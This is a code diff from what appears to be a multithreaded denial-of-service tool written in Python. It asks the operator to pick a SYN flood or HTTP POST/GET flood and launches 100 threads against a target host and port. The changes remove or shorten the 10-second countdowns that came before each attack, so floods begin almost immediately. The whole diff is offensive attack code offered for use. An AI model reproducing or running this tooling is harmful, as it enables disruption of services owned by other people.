@@ -43,11 +43,11 @@ try:
 
     elif attack_type == choices[1]:
         protocolAttack = ty.ProtocolAttack
-        subtype1 = int(input(" pof(2)\n"))
+        subtype1 = int(input("Syn_flood(1) or pof(2)\n"))
         if subtype1 == 1:
             print("Now u have 10 second for end the attack... \n")
-            time.sleep(10)
-            Syn_flood = protocolAttack.syn_flood(vector, port)
+            time.sleep(1)
+            Syn_flood = protocolAttack.syn_flood(vector, port, bye)
             for i in range(100):
                 t = th.Thread(target=Syn_flood, args=(i,))
                 Threads.append(t)
@@ -65,8 +65,6 @@ try:
         applicationLayerAttack = ty.ApplicationLayerAttack
         subtype2 = int(input("Post(1) or Get(2)\n"))
         if subtype2 == 1:
-            print("Now u have 10 second for end the attack... \n")
-            time.sleep(10)
             Post = applicationLayerAttack.post(vector, bye)
             for i in range(100):
                 t = th.Thread(target=Post, args=(i,))
@@ -74,8 +72,6 @@ try:
                 t.start()
                 print("using post method to: ", vector)
         else:
-            print("Now u have 10 second for end the attack... \n")
-            time.sleep(10)
             Get = applicationLayerAttack.get(vector, bye)
             for i in range(100):
                 t = th.Thread(target=Get, args=(i,))
